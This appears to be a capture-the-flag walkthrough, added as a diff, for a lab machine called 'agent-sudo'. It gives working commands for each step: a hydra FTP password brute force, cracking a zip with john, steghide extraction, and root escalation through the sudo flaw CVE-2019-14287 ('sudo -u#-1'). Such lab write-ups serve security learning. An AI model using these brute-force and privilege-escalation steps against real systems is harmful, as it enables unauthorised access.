@@ -1,0 +1,70 @@
+
+
+
+#Ports open
+
+21 ftp
+22 ssh 
+80 http
+
+
+#Found user name through changing user agent to C on http-server
+username:chris
+
+#hydra to brute password 
+
+hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.221.45 ftp
+
+[21][ftp] host: 10.10.221.45   login: chris   password: crystal
+
+
+#connect to ftp , then download the files from ftp server.
+
+#one of the image had embeded zip file in it extract using binwalk
+
+binwalk -e cutie.png
+
+
+#zip file asks for password ,so use john to crack it
+
+
+zip2john 8702.zip >crackme
+
+john crackme
+
+output:alien 
+
+#use the password 'alien' to crack the zip 
+#extracted file contains QXJlYTUx string
+
+echo QXJlYTUx | base64 -d
+
+output:Area51
+
+#use steghide to extract from the image file
+
+steghide extract -sf cute-alien.jpg
+
+passphrase:Area51
+
+#ssh into james account
+
+james@agent-sudo:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+
+
+
+#Vulnerability cve-2019-14287 : function fails to parse all values correctly and when giving the parameter user id “-1” or its unsigned number “4294967295”, the command will run as root, bypassing the security policy entry we set in the example above
+
+
+james@agent-sudo:~$ sudo -u#-1 /bin/bash -i
+root@agent-sudo:~# whoami 
+root
+
+
+
